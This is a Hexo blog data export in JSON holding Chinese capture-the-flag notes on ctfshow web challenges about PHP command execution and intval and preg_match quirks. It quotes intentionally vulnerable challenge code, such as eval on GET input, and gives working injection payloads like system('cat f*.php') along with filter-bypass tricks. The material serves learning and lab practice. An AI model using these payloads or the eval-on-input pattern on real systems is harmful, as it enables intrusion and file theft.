{"meta":{"title":"Hexo","subtitle":"","description":"","author":"Mini Full","url":"http://example.com","root":"/"},"pages":[{"title":"分类","date":"2021-11-05T09:39:57.000Z","updated":"2021-11-11T02:46:13.564Z","comments":false,"path":"categories/index.html","permalink":"http://example.com/categories/index.html","excerpt":"","text":""},{"title":"about","date":"2021-11-05T10:08:34.000Z","updated":"2021-11-05T10:09:07.176Z","comments":false,"path":"about/index.html","permalink":"http://example.com/about/index.html","excerpt":"","text":""},{"title":"404","date":"2021-11-05T10:15:10.000Z","updated":"2021-11-05T10:16:37.893Z","comments":false,"path":"404/index.html","permalink":"http://example.com/404/index.html","excerpt":"","text":""},{"title":"friends","date":"2021-11-05T10:13:49.000Z","updated":"2021-11-05T10:13:49.522Z","comments":false,"path":"friends/index.html","permalink":"http://example.com/friends/index.html","excerpt":"","text":""},{"title":"标签","date":"2021-11-05T09:49:44.000Z","updated":"2021-11-11T02:46:28.767Z","comments":false,"path":"tags/index.html","permalink":"http://example.com/tags/index.html","excerpt":"","text":""}],"posts":[{"title":"命令执行","slug":"命令执行","date":"2021-11-14T08:36:03.000Z","updated":"2021-11-14T08:54:03.732Z","comments":true,"path":"2021/11/14/命令执行/","link":"","permalink":"http://example.com/2021/11/14/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/","excerpt":"","text":"ctfshow命令执行笔记web29源码： 1234567891011121314151617181920212223&lt;php/*# -*- coding: utf-8 -*-# @Author: h1xa# @Date: 2020-09-04 00:12:34# @Last Modified by: h1xa# @Last Modified time: 2020-09-04 00:26:48# @email: h1xa@ctfer.com# @link: https://ctfer.com*/error_reporting(0);if(isset($_GET[&#x27;c&#x27;]))&#123; $c = $_GET[&#x27;c&#x27;]; if(!preg_match(&quot;/flag/i&quot;, $c))&#123; eval($c); &#125; &#125;else&#123; highlight_file(__FILE__);&#125; 分析考点： 这题中看到两个函数 ​ eval() ​ preg_match 通过百度可知 ​ eval() 函数的功能是获取返回值 ​ preg_match 是执行正则表达式，在题中是起到一个过滤的作用。 解题： ​ 在代码中，我们可以看到过滤了 flag 而且不区分大小写 12345所需要使用的知识点 通配符 1. * 可以匹配0或多个字符 2. ? 可以匹配任意一个字符 3. [abcd] 匹配abcd中任何一个字符 4. [a-z] 匹配范围a到z，表示范围的意思 []匹配中括号中的任意一个字符 ​ 所以在这 flag 可以用 f* 或 f??? 代替 ​ 所以这个题的payload 123?c=system(&quot;cat f*.php&quot;);?c=system(&quot;cat f*&quot;);?c=system(&quot;cat f???.php&quot;); ​ 也可以使用 cp 命令 12?c=system(&quot;cp fla?.php 1.txt&quot;); //意思就是复制flag.php文件 明名为 1.txt?c=system(&quot;cat 1.txt&quot;); //然后查看1.txt ​ 再补充一个，绕过可以用引号，反斜杠 1flag=fl\\ag=fl&#x27;&#x27;ag flag:","categories":[{"name":"ctfshow","slug":"ctfshow","permalink":"http://example.com/categories/ctfshow/"}],"tags":[{"name":"ctf","slug":"ctf","permalink":"http://example.com/tags/ctf/"}]},{"title":"php特性","slug":"php特性","date":"2021-11-11T02:49:11.000Z","updated":"2021-11-11T13:18:30.674Z","comments":true,"path":"2021/11/11/php特性/","link":"","permalink":"http://example.com/2021/11/11/php%E7%89%B9%E6%80%A7/","excerpt":"","text":"web89源码： 1234567891011121314151617181920212223242526&lt;?php/*# -*- coding: utf-8 -*-# @Author: h1xa# @Date: 2020-09-16 11:25:09# @Last Modified by: h1xa# @Last Modified time: 2020-09-18 15:38:51# @email: h1xa@ctfer.com# @link: https://ctfer.com*/include(&quot;flag.php&quot;);highlight_file(__FILE__);if(isset($_GET[&#x27;num&#x27;]))&#123; $num = $_GET[&#x27;num&#x27;]; if(preg_match(&quot;/[0-9]/&quot;, $num))&#123; die(&quot;no no no!&quot;); &#125; if(intval($num))&#123; echo $flag; &#125;&#125; 查看一下 intval 函数说明,就可以知道使用数组来绕过 进一步查看，可以知道 preg_match 是无法处理数组的 利用 preg_match() 函数无法处理数组的漏洞 payload: 12?num[]=9?num[]= web90源码： 123456789101112131415161718192021222324252627&lt;?php/*# -*- coding: utf-8 -*-# @Author: h1xa# @Date: 2020-09-16 11:25:09# @Last Modified by: h1xa# @Last Modified time: 2020-09-18 16:06:11# @email: h1xa@ctfer.com# @link: https://ctfer.com*/include(&quot;flag.php&quot;);highlight_file(__FILE__);if(iseet($_GET[&#x27;num&#x27;]))&#123; $num = $_GET[&#x27;num&#x27;]; if($num===&quot;4476&quot;)&#123; die(&quot;no no no!&quot;); &#125; if(intval($num,0)===4476)&#123; echo $flag; &#125;else&#123; echo intval($num,0) &#125;&#125; 这个题也是参考 intval 函数的，只需要了解该函数的第二个参数就可以知道 payload: 123?num=0x117c?num=010574?num=4476a //a可以为任意字母 web91源码： 1234567891011121314151617181920212223242526272829&lt;?php/*# -*- coding: utf-8 -*-# @Author: Firebasky# @Date: 2020-09-16 11:25:09# @Last Modified by: h1xa# @Last Modified time: 2020-09-18 16:16:09# @link: https://ctfer.com*/show_source(__FILE__);include(&#x27;flag.php&#x27;);$a=$_GET[&#x27;cmd&#x27;];if(preg_match(&#x27;/^php$/im&#x27;, $a))&#123; if(preg_match(&#x27;/^php$i&#x27;, $a))&#123; echo &#x27;hacker&#x27;; &#125; else&#123; echo $flag; &#125;&#125;else&#123; echo &#x27;nonononono&#x27;;&#125;Notice: Undefined index: cmd in /var/www/html/index.php on line 15nonononono 分析： ​ 1.正则表达式：/^php$/im: ​ ^:匹配输入字符串的开始位置 ​ $:匹配输入字符串的结尾位置 ​ i:不区分大小写 ​ m:多行匹配，使边界字符串为 php 才能为针进入此if中 ​ 2.正则表示 /^php$/i: 与上一个正则相比少了多行匹配。所以突入点就是这个 m ​ 3.第二个 if 语句不能满足才能得到 flag 的意思就是 第二个 if 他不能匹配到这个字符串 php ​ 4.第一个 if 语句多行匹配到字符串 php ​ 5. 因此得让第一个多行匹配能匹配到字符串 php 而第二个不能匹配到字符串 php 就得让第一行为 php 第二行或第三行不为 php","categories":[{"name":"ctfshow","slug":"ctfshow","permalink":"http://example.com/categories/ctfshow/"}],"tags":[{"name":"ctf","slug":"ctf","permalink":"http://example.com/tags/ctf/"}]}],"categories":[{"name":"ctfshow","slug":"ctfshow","permalink":"http://example.com/categories/ctfshow/"}],"tags":[{"name":"ctf","slug":"ctf","permalink":"http://example.com/tags/ctf/"}]}